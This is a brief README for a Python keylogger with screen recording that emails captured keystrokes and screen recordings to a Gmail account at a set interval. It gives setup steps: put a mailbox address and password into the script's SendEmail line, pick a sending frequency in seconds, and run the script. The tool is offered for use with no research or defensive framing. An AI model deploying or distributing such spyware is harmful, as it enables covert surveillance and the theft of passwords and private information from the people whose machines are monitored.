# Keylogger with screen recorder
A keylogger that sends logs on email and records screen.

# Instructions

- Change 182 line in Python file to set your email and password **(ONLY GMAIL MAILBOX)**
```python
182. e = SendEmail('YOUR_EMAIL', 'YOUR_PASSWORD', TIME)
```
**Remember to set the frequency of sending emails on your mailbox by changing the TIME value**

The TIME value is expressed in seconds

> Example

```python
182. e = SendEmail('mailbox@gmail.com', 'password1', 10)
```

- Run script
